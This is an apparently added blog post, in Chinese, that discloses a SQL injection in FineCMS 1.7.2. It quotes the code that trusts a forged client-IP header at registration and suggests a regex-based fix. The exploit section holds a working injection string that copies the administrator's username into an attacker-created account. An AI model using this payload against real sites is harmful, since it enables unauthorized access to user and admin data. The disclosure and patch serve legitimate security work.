@@ -1,0 +1,104 @@
+---
+layout: post
+title: "FineCms 1.7.2 注射漏洞"
+date: 2012-11-22 13:12
+comments: true
+categories: Code&nbspAudit
+---
+>
+# 简介:
+
+## FineCMS是一款基于PHP+MySql开发的内容管理系统,采用MVC设计模式，实现业务逻辑与表现层的适当分离，使网页设计师能够轻松设计出理想的模板。
+
+>
+# 漏洞文件:
+
+## Client.Class.php 29行处:
+<pre>
+<code>
+        public static function get_user_ip() {
+                if(getenv('HTTP_CLIENT_IP') && strcasecmp(getenv('HTTP_CLIENT_IP'), 'unknown')) {
+                        $onlineip = getenv('HTTP_CLIENT_IP');
+                } elseif(getenv('HTTP_X_FORWARDED_FOR') && strcasecmp(getenv('HTTP_X_FORWARDED_FOR'), 'unknown')) {
+                        $onlineip = getenv('HTTP_X_FORWARDED_FOR');
+                } elseif(getenv('REMOTE_ADDR') && strcasecmp(getenv('REMOTE_ADDR'), 'unknown')) {
+                        $onlineip = getenv('REMOTE_ADDR');
+                } elseif(isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], 'unknown')) {
+                        $onlineip = $_SERVER['REMOTE_ADDR'];
+                }
+                return $onlineip;
+        }
+/* 显然可以伪造一个client_ip进行注入 */
+</code>
+</pre>
+## RegsiterControll.php 145行处:
+<pre>
+<code>
+  private function reg($data) {
+            if (empty($data)) return false;
+                $data['groupid']  = 1;
+                $data['regdate']  = time(); 
+        $data['regip']    = client::get_user_ip();//使用了存在漏洞的get_user_ip方法,漏洞就此产生
+        $data['status']          = $this->memberconfig['status']  ? 0 : 1;
+                $data['modelid']  = (!isset($data['modelid']) || empty($data['modelid'])) ? $this->memberconfig['modelid'] : $data['modelid'];
+                if (!isset($this->membermodel[$data['modelid']])) $this->memberMsg('会员模型不存在，请联系管理员。');
+                if ($this->memberconfig['uc_use'] == 1) {
+                    if (uc_get_user($data['username'])) {
+                                $this->memberMsg('该用户无需注册，请直接登录激活！', url('member/login'), 1);
+                        }
+                        $uid = uc_user_register($data['username'], $data['password'], $data['email']);
+                        if ($uid <= 0) {
+                                if ($uid == -1) {
+                                        $this->memberMsg('用户名不合法');
+                                } elseif($uid == -2) {
+                                        $this->memberMsg('包含要允许注册的词语');
+                                } elseif($uid == -3) {
+                                        $this->memberMsg('用户名已经存在');
+                                } elseif($uid == -4) {
+                                        $this->memberMsg('Email 格式有误');
+                                } elseif($uid == -5) {
+                                        $this->memberMsg('Email 不允许注册');
+                                } elseif($uid == -6) {
+                                        $this->memberMsg('该 Email 已经被注册');
+                                } else {
+                                        $this->memberMsg('未定义');
+                                }
+                        } else {
+                                $username = $data['username'];
+                        }
+                }
+            $data['password'] = md5($data['password']);
+                $userid = $this->member->insert($data);
+                return $userid;
+        }
+</code>
+</pre>
+>
+# 漏洞利用:
+
+## EXP:提交用户注册的时候,伪造一个client_ip,内容如下:
+sb','1','6'),('hell','1b192f49ddec03d0c7e777d3e578cebf',(select username from fn_user where userid=1),'1','11111','sbd','1','6')#
+成功之后,登陆用户:hell,密码:sbdan. 邮箱处就有管理员的user了.
+
+>
+# 修补建议:
+<pre>
+<code>
+function get_user_ip(){
+    if(getenv('HTTP_CLIENT_IP') && strcasecmp(getenv('HTTP_CLIENT_IP'), 'unknown')) {
+      $onlineip = getenv('HTTP_CLIENT_IP');
+     } elseif(getenv('HTTP_X_FORWARDED_FOR') && strcasecmp(getenv('HTTP_X_FORWARDED_FOR'), 'unknown')) {
+      $onlineip = getenv('HTTP_X_FORWARDED_FOR');
+   } elseif(getenv('REMOTE_ADDR') && strcasecmp(getenv('REMOTE_ADDR'), 'unknown')) {
+      $onlineip = getenv('REMOTE_ADDR');
+   } elseif(isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], 'unknown')) {
+      $onlineip = $_SERVER['REMOTE_ADDR'];
+} 
+ 
+   preg_match("/[\d\.]{7,15}/", $onlineip, $onlineipmatches);
+   $onlineip = $onlineipmatches[0] ? $onlineipmatches[0] : 'unknown';
+   return $onlineip;
+}
+
+</code>
+</pre>
